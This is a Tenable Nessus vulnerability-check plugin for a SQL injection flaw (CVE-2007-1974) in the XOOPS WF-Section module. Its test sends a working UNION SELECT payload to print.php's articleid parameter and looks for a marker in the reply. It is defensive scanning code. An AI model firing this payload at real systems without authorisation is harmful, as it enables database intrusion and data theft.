#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(24908);
  script_version("1.25");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2007-1974");
  script_bugtraq_id(23259);
  script_xref(name:"EDB-ID", value:"3644");

  script_name(english:"XOOPS WF-Section Module print.php articleid Parameter SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running the WF-Section module, a third-party module
for XOOPS. 

The version of this module installed on the remote host fails to
properly sanitize user-supplied input to the 'articleid' parameter of
the 'modules/wfsection/print.php' script before using it to build a
database query.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated, remote attacker can leverage this issue to launch SQL
injection attacks against the affected application, leading to
discovery of sensitive information, attacks against the underlying
database, and the like.");
  script_set_attribute(attribute:"see_also", value:"https://xoops.org/modules/news/article.php?storyid=3717");
  script_set_attribute(attribute:"solution", value:
"Upgrade to WF-Section version 1.02 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/04/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wf-sections:wf-sections");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_require_keys("www/xoops");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to manipulate the main text.
  magic = unixtime();
  exploit = string("9999999 UNION SELECT 1111,2222,3333,4444,", magic, ",6666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--");

  r = http_send_recv3(method:"GET", port:port, 
    item:string(
      dir, "/modules/wfsection/print.php?",
      "articleid=", urlencode(str:exploit)
    ));
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if we managed to set the description based on our magic.
  if (
    "modules/wfsection/images/logo.gif" >< res &&
    string("<tr><td>", magic, "<br /><br /><br /><hr /><br />") >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
